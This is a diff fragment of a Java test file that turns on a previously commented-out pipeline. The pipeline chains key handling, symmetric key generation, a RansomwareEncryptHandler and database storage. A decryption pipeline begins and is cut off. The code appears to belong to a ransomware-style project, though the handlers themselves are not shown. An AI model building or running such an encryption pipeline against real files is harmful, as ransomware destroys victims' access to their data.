@@ -40,14 +40,14 @@ public class ExampleTest {
         pipelineData.setPublicKey(PubicKey);
         pipelineData.setRootPath(testPath.toAbsolutePath().toString());
 
-//        Pipeline<PipelineData, PipelineData> encrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
-//                .addHandler(new DecryptKeyHandler())
-//                .addHandler(new GenSymmetricKeyHandler())
-//                .addHandler(new RansomwareEncryptHandler())
-//                .addHandler(new EncryptKeyHandler())
-//                .addHandler(new DatabaseStoreHandler());
-//        var encrypt_output = encrypt_filters.execute(pipelineData);
-//        System.out.println("Pipeline output: " + encrypt_output);
+        Pipeline<PipelineData, PipelineData> encrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
+                .addHandler(new DecryptKeyHandler())
+                .addHandler(new GenSymmetricKeyHandler())
+                .addHandler(new RansomwareEncryptHandler())
+                .addHandler(new EncryptKeyHandler())
+                .addHandler(new DatabaseStoreHandler());
+        var encrypt_output = encrypt_filters.execute(pipelineData);
+        System.out.println("Pipeline output: " + encrypt_output);
 
 
         Pipeline<PipelineData, PipelineData> decrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
